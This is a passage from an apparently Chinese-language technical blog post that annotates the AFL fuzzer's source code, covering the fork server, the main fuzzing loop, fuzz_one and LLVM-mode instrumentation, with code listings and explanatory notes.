class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><code class="hljs c">EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">init_forkserver</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">itimerval</span> <span class="hljs-title">it</span>;</span><br>  <span class="hljs-type">int</span> st_pipe[<span class="hljs-number">2</span>], ctl_pipe[<span class="hljs-number">2</span>];<span class="hljs-comment">//状态通道与控制通道</span><br>  <span class="hljs-type">int</span> status;<br>  s32 rlen;<br><br>  ACTF(<span class="hljs-string">&quot;Spinning up the fork server...&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (pipe(st_pipe) || pipe(ctl_pipe)) PFATAL(<span class="hljs-string">&quot;pipe() failed&quot;</span>);<span class="hljs-comment">//两个管道都建立失败，报错</span><br><br>  forksrv_pid = fork();<br><br>  <span class="hljs-keyword">if</span> (forksrv_pid &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;fork() failed&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (!forksrv_pid) &#123;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">r</span>;</span><br><br>    <span class="hljs-comment">/* Umpf. On OpenBSD, the default fd limit for root users is set to</span><br><span class="hljs-comment">       soft 128. Let&#x27;s try to fix that... */</span><br><br>    <span class="hljs-keyword">if</span> (!getrlimit(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="hljs-number">2</span>) &#123;<br><br>      r.rlim_cur = FORKSRV_FD + <span class="hljs-number">2</span>;<br>      setrlimit(RLIMIT_NOFILE, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mem_limit) &#123;<br><br>      r.rlim_max = r.rlim_cur = ((<span class="hljs-type">rlim_t</span>)mem_limit) &lt;&lt; <span class="hljs-number">20</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br><br>      setrlimit(RLIMIT_AS, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>      <span class="hljs-comment">/* This takes care of OpenBSD, which doesn&#x27;t have RLIMIT_AS, but</span><br><span class="hljs-comment">         according to reliable sources, RLIMIT_DATA covers anonymous</span><br><span class="hljs-comment">         maps - so we should be getting good protection against OOM bugs. */</span><br><br>      setrlimit(RLIMIT_DATA, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br><br>    &#125;<br><br>    <span class="hljs-comment">/* Dumping cores is slow and can lead to anomalies if SIGKILL is delivered</span><br><span class="hljs-comment">       before the dump is complete. */</span><br><br>    r.rlim_max = r.rlim_cur = <span class="hljs-number">0</span>;<br><br>    setrlimit(RLIMIT_CORE, &amp;r); <span class="hljs-comment">/* Ignore errors */</span><br><br>    <span class="hljs-comment">/* Isolate the process and configure standard descriptors. If out_file is</span><br><span class="hljs-comment">       specified, stdin is /dev/null; otherwise, out_fd is cloned instead. */</span><br><br>    setsid();<br><br>    dup2(dev_null_fd, <span class="hljs-number">1</span>);<br>    dup2(dev_null_fd, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-keyword">if</span> (out_file) &#123;<br><br>      dup2(dev_null_fd, <span class="hljs-number">0</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      dup2(out_fd, <span class="hljs-number">0</span>);<br>      close(out_fd);<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Set up control and status pipes, close the unneeded original fds. */</span><br><br>    <span class="hljs-keyword">if</span> (dup2(ctl_pipe[<span class="hljs-number">0</span>], FORKSRV_FD) &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;dup2() failed&quot;</span>);<br>    <span class="hljs-keyword">if</span> (dup2(st_pipe[<span class="hljs-number">1</span>], FORKSRV_FD + <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;dup2() failed&quot;</span>);<br><br>    close(ctl_pipe[<span class="hljs-number">0</span>]);<br>    close(ctl_pipe[<span class="hljs-number">1</span>]);<br>    close(st_pipe[<span class="hljs-number">0</span>]);<br>    close(st_pipe[<span class="hljs-number">1</span>]);<br><br>    close(out_dir_fd);<br>    close(dev_null_fd);<br>    close(dev_urandom_fd);<br>    close(fileno(plot_file));<br><br>    <span class="hljs-comment">/* This should improve performance a bit, since it stops the linker from</span><br><span class="hljs-comment">       doing extra work post-fork(). */</span><br><br>    <span class="hljs-keyword">if</span> (!getenv(<span class="hljs-string">&quot;LD_BIND_LAZY&quot;</span>)) setenv(<span class="hljs-string">&quot;LD_BIND_NOW&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* Set sane defaults for ASAN if nothing else specified. */</span><br><br>    setenv(<span class="hljs-string">&quot;ASAN_OPTIONS&quot;</span>, <span class="hljs-string">&quot;abort_on_error=1:&quot;</span><br>                           <span class="hljs-string">&quot;detect_leaks=0:&quot;</span><br>                           <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                           <span class="hljs-string">&quot;allocator_may_return_null=1&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* MSAN is tricky, because it doesn&#x27;t support abort_on_error=1 at this</span><br><span class="hljs-comment">       point. So, we do this in a very hacky way. */</span><br><br>    setenv(<span class="hljs-string">&quot;MSAN_OPTIONS&quot;</span>, <span class="hljs-string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="hljs-string">&quot;:&quot;</span><br>                           <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                           <span class="hljs-string">&quot;abort_on_error=1:&quot;</span><br>                           <span class="hljs-string">&quot;allocator_may_return_null=1:&quot;</span><br>                           <span class="hljs-string">&quot;msan_track_origins=0&quot;</span>, <span class="hljs-number">0</span>);<br><br>    execv(target_path, argv);<br><br>    <span class="hljs-comment">/* Use a distinctive bitmap signature to tell the parent about execv()</span><br><span class="hljs-comment">       falling through. */</span><br><br>    *(u32*)trace_bits = EXEC_FAIL_SIG;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>  &#125;<br><br>  <span class="hljs-comment">/* Close the unneeded endpoints. */</span><br><br>  close(ctl_pipe[<span class="hljs-number">0</span>]);<br>  close(st_pipe[<span class="hljs-number">1</span>]);<br><br>  fsrv_ctl_fd = ctl_pipe[<span class="hljs-number">1</span>];<br>  fsrv_st_fd  = st_pipe[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span><br><br>  it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="hljs-number">1000</span>);<br>  it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="hljs-number">1000</span>) * <span class="hljs-number">1000</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br><br>  rlen = read(fsrv_st_fd, &amp;status, <span class="hljs-number">4</span>);<br><br>  it.it_value.tv_sec = <span class="hljs-number">0</span>;<br>  it.it_value.tv_usec = <span class="hljs-number">0</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span><br><span class="hljs-comment">     Otherwise, try to figure out what went wrong. */</span><br><br>  <span class="hljs-keyword">if</span> (rlen == <span class="hljs-number">4</span>) &#123;<br>    OKF(<span class="hljs-string">&quot;All right - fork server is up.&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (child_timed_out)<br>    FATAL(<span class="hljs-string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (waitpid(forksrv_pid, &amp;status, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>)<br>    PFATAL(<span class="hljs-string">&quot;waitpid() failed&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;<br><br>    <span class="hljs-keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="hljs-number">500</span> &amp;&amp; uses_asan) &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! Since it seems to be built with ASAN and you have a\n&quot;</span><br>           <span class="hljs-string">&quot;    restrictive memory limit configured, this is expected; please read\n&quot;</span><br>           <span class="hljs-string">&quot;    %s/notes_for_asan.txt for help.\n&quot;</span>, doc_path);<br><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!mem_limit) &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span><br>           <span class="hljs-string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>           <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>           <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>           <span class="hljs-string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>           <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>           <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The current memory limit (%s) is too restrictive, causing the\n&quot;</span><br>           <span class="hljs-string">&quot;      target to hit an OOM condition in the dynamic linker. Try bumping up\n&quot;</span><br>           <span class="hljs-string">&quot;      the limit with the -m setting in the command line. A simple way confirm\n&quot;</span><br>           <span class="hljs-string">&quot;      this diagnosis would be:\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br>           <span class="hljs-string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>           <span class="hljs-string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>           <span class="hljs-string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span><br>           <span class="hljs-string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span><br>           <span class="hljs-string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>           <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>           <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>           <span class="hljs-string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>           <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>           <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,<br>           DMS(mem_limit &lt;&lt; <span class="hljs-number">20</span>), mem_limit - <span class="hljs-number">1</span>);<br><br>    &#125;<br><br>    FATAL(<span class="hljs-string">&quot;Fork server crashed with signal %d&quot;</span>, WTERMSIG(status));<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (*(u32*)trace_bits == EXEC_FAIL_SIG)<br>    FATAL(<span class="hljs-string">&quot;Unable to execute target application (&#x27;%s&#x27;)&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="hljs-number">500</span> &amp;&amp; uses_asan) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>           <span class="hljs-string">&quot;    handshake with the injected code. Since it seems to be built with ASAN and\n&quot;</span><br>           <span class="hljs-string">&quot;    you have a restrictive memory limit configured, this is expected; please\n&quot;</span><br>           <span class="hljs-string">&quot;    read %s/notes_for_asan.txt for help.\n&quot;</span>, doc_path);<br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!mem_limit) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>         <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>         <span class="hljs-string">&quot;    handshake with the injected code. Perhaps there is a horrible bug in the\n&quot;</span><br>         <span class="hljs-string">&quot;    fuzzer. Poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>         <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>         <span class="hljs-string">&quot;    handshake with the injected code. There are %s probable explanations:\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;%s&quot;</span><br>         <span class="hljs-string">&quot;    - The current memory limit (%s) is too restrictive, causing an OOM\n&quot;</span><br>         <span class="hljs-string">&quot;      fault in the dynamic linker. This can be fixed with the -m option. A\n&quot;</span><br>         <span class="hljs-string">&quot;      simple way to confirm the diagnosis may be:\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br>         <span class="hljs-string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>         <span class="hljs-string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>         <span class="hljs-string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span><br>         <span class="hljs-string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>         <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,<br>         getenv(DEFER_ENV_VAR) ? <span class="hljs-string">&quot;three&quot;</span> : <span class="hljs-string">&quot;two&quot;</span>,<br>         getenv(DEFER_ENV_VAR) ?<br>         <span class="hljs-string">&quot;    - You are using deferred forkserver, but __AFL_INIT() is never\n&quot;</span><br>         <span class="hljs-string">&quot;      reached before the program terminates.\n\n&quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>         DMS(mem_limit &lt;&lt; <span class="hljs-number">20</span>), mem_limit - <span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Fork server handshake failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>perform_dry_run函数</strong></p><p>遍历<code>input</code>队列，读取文件内容，调用<code>calibrate_case</code>进行校准，收集错误信息<br><strong>run_target函数</strong><br>执行目标程序，传回状态信息。<br><strong>cull_queue函数</strong><br>通过遍历top_rated[]条目，获取“获胜者”，这些获胜者会获得更多执行时间。优化作用。<br>等等，还要许多配置函数，为环境的顺利做准备。<br><strong>主循环</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><br>    u8 skipped_fuzz;<br><br>    cull_queue();<br><br>    <span class="hljs-keyword">if</span> (!queue_cur) &#123;<span class="hljs-comment">//如果queue当前为空，即执行完一轮</span><br><br>      queue_cycle++;<br>      current_entry     = <span class="hljs-number">0</span>;<br>      cur_skipped_paths = <span class="hljs-number">0</span>;<br>      queue_cur         = <span class="hljs-built_in">queue</span>;<span class="hljs-comment">//准备下一轮</span><br><br>      <span class="hljs-keyword">while</span> (seek_to) &#123;<span class="hljs-comment">//从seek_to指定项开始执行。</span><br>        current_entry++;<br>        seek_to--;<br>        queue_cur = queue_cur-&gt;next;<br>      &#125;<br><br>      show_stats();<br><br>      <span class="hljs-keyword">if</span> (not_on_tty) &#123;<br>        ACTF(<span class="hljs-string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>      &#125;<br><br>      <span class="hljs-comment">/* If we had a full queue cycle with no new finds, try</span><br><span class="hljs-comment">         recombination strategies next. */</span><br><br>      <span class="hljs-keyword">if</span> (queued_paths == prev_queued) &#123;<span class="hljs-comment">//如果path数没变，即没有新发现</span><br><br>        <span class="hljs-keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="hljs-keyword">else</span> use_splicing = <span class="hljs-number">1</span>;<span class="hljs-comment">//是否使用splicing策略</span><br><br>      &#125; <span class="hljs-keyword">else</span> cycles_wo_finds = <span class="hljs-number">0</span>;<br><br>      prev_queued = queued_paths;<span class="hljs-comment">//更新路径数</span><br><br>      <span class="hljs-keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="hljs-number">1</span> &amp;&amp; getenv(<span class="hljs-string">&quot;AFL_IMPORT_FIRST&quot;</span>))<br>        sync_fuzzers(use_argv);<br><br>    &#125;<br><br>    skipped_fuzz = fuzz_one(use_argv);<span class="hljs-comment">//关键函数fuzz_one</span><br><br>    <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;<br>      <br>      <span class="hljs-keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))<br>        sync_fuzzers(use_argv);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="hljs-number">2</span>;<br><br>    <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">break</span>;<br><br>    queue_cur = queue_cur-&gt;next;<br>    current_entry++;<br><br>  &#125;<br></code></pre></td></tr></table></figure><p><strong>关键函数fuzz_one()</strong></p><ul><li>先进行优化：概率跳过普通执行项或已执行项，去执行favored</li><li>对于已经fuzz过的或者non-favored的有99%的概率跳过；无pending_favored，95%跳过fuzzed&amp;non-favored，75%跳过not fuzzed&amp;non-favored，不跳过favored；</li><li>打开当前输入文件，读入len长度的buf，关闭文件</li><li>（当之前修理失败时）再次调用<code>celibrate_case</code>，</li><li>修剪：不要重复修剪，哪怕修建失败了</li><li>将读入的buf复制到out_buf</li><li>进行打分，对每个测试用例</li><li>如果我们已经亲自对这里的测试用例进行了fuzzing或早些时候，进行了决定性的测试，跳过这里直接前往<code>havoc_stage</code></li></ul><p><strong>简单位翻转bitflip</strong></p><h2 id="afl-llvm-mode"><a href="#afl-llvm-mode" class="headerlink" title="afl-llvm_mode"></a>afl-llvm_mode</h2><p><strong>关于LLVM</strong></p><ul><li>LLVM 主要为了解决编译时多种多样的前端和后端导致编译环境复杂、苛刻的问题，其核心为设计了一个称为<code> LLVM IR</code> 的中间表示，并以库的形式提供一些列接口，以提供诸如操作 IR 、生成目标平台代码等等后端的功能。</li><li>不同的前端和后端使用统一的中间代码<code>LLVM InterMediate Representation(LLVM IR)</code>，其结果就是如果需要支持一门新的编程语言，只需要实现一个新的前端；如果需要支持一款新的硬件设备，只需要实现一个新的后端；优化阶段为通用阶段，针对统一的 LLVM IR ，与新的编程语言和硬件设备无关。</li><li>GCC 的前后端耦合在一起，没有进行分离，所以GCC为了支持一门新的编程语言或一个新的硬件设备，需要重新开发前端到后端的完整过程。</li><li>Clang 是 LLVM 项目的一个子项目，它是 LLVM 架构下的 C/C++/Objective-C 的编译器，是 LLVM 前端的一部分。相较于GCC，具备编译速度快、占用内存少、模块化设计、诊断信息可读性强、设计清晰简单等优点。</li><li>代码首先由编译器前端clang处理后得到中间代码IR，然后经过各 LLVM Pass 进行优化和转换，最终交给编译器后端生成机器码（<strong>LLVM Pass 是一些中间过程处理 IR 的可以用户自定义的内容，可以用来遍历、修改 IR 以达到插桩、优化、静态分析等目的。</strong>）</li></ul><p><strong>afl-clang-fast</strong><br>1.概述<br>AFL的 llvm_mode 可以实现编译器级别的插桩，可以替代 afl-gcc 或 afl-clang 使用的比较“粗暴”的汇编级别的重写的方法，且具备如下几个优势：</p><ul><li>编译器可以进行优化以提升效率；</li><li>实现与CPU无关，可以在非x86架构上进行fuzz；</li><li>可以更好处理多线程目标程序。</li></ul><p>关于此<code>llvm_mode</code>文件夹：</p><ul><li><code>afl-llvm-rt.o</code>重写了<code>afl-as.h</code>中的main_payload，用于调用；</li><li><code>afl-llvm-pass.so.cc</code>文件主要是当通过 afl-clang-fast 调用 clang 时，这个pass被插入到 LLVM 中，告诉编译器添加与 <code>afl-as.h</code> 中大致等效的代码；</li><li><code>afl-clang-fast.c</code> 文件本质上是 clang 的 wrapper，最终调用的还是 clang 。但是与 afl-gcc 一样，会进行一些参数处理。</li></ul><p><strong><code>llvm_mode</code> 的插桩思路就是通过编写pass来实现信息记录，对每个基本块都插入探针，具体代码在 <code>afl-llvm-pass.so.cc</code> 文件中，初始化和forkserver操作通过链接完成。</strong></p><p><strong>源码分析</strong></p><p><strong>find_pbj</strong><br>寻找运行时的<code>librabies</code>，若失败，abort。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">find_obj</span><span class="hljs-params">(u8* argv0)</span> &#123;<br><br>  u8 *afl_path = getenv(<span class="hljs-string">&quot;AFL_PATH&quot;</span>);<span class="hljs-comment">//寻找AFL_PATH</span><br>  u8 *slash, *tmp;<br><br>  <span class="hljs-keyword">if</span> (afl_path) &#123;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-llvm-rt.o&quot;</span>, afl_path);<span class="hljs-comment">//将afl-llvm-rt.o的路径写入tmp</span><br><br>    <span class="hljs-keyword">if</span> (!access(tmp, R_OK)) &#123;<span class="hljs-comment">//如果该路径可以访问，且可读</span><br>      obj_path = afl_path;<span class="hljs-comment">//赋值给obj_path</span><br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br><br>  &#125;<br><br>  slash = <span class="hljs-built_in">strrchr</span>(argv0, <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-comment">//返回斜杠最后一次出现处的指针</span><br><br>  <span class="hljs-keyword">if</span> (slash) &#123;<span class="hljs-comment">//存在斜杠</span><br><br>    u8 *dir;<br><br>    *slash = <span class="hljs-number">0</span>;<br>    dir = ck_strdup(argv0);<br>    *slash = <span class="hljs-string">&#x27;/&#x27;</span>;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-llvm-rt.o&quot;</span>, dir);<br><br>    <span class="hljs-keyword">if</span> (!access(tmp, R_OK)) &#123;<br>      obj_path = dir;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br>    ck_free(dir);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!access(AFL_PATH <span class="hljs-string">&quot;/afl-llvm-rt.o&quot;</span>, R_OK)) &#123;<br>    obj_path = AFL_PATH;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Unable to find &#x27;afl-llvm-rt.o&#x27; or &#x27;afl-llvm-pass.so&#x27;. Please set AFL_PATH&quot;</span>);<br> <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先，读取环境变量 AFL_PATH 的值：<ul><li>如果读取成功，确认 <code>AFL_PATH/afl-llvm-rt.o</code> 是否可以访问；如果可以访问，设置该目录为 <code>obj_path</code> ，然后直接返回；</li><li>如果读取失败，检查 <code>arg0</code> 中是否存在<code> /</code> 字符，如果存在，则判断最后一个 <code>/ </code>前面的路径为 AFL 的根目录；然后读取<code>afl-llvm-rt.o</code>文件，成功读取，设置该目录为<code> obj_path</code> ，然后直接返回。</li></ul></li><li>如果上面两种方式都失败，到<code>/usr/local/lib/afl</code> 目录下查找是否存在 <code>afl-llvm-rt.o</code> ，如果存在，则设置为 <code>obj_path</code> 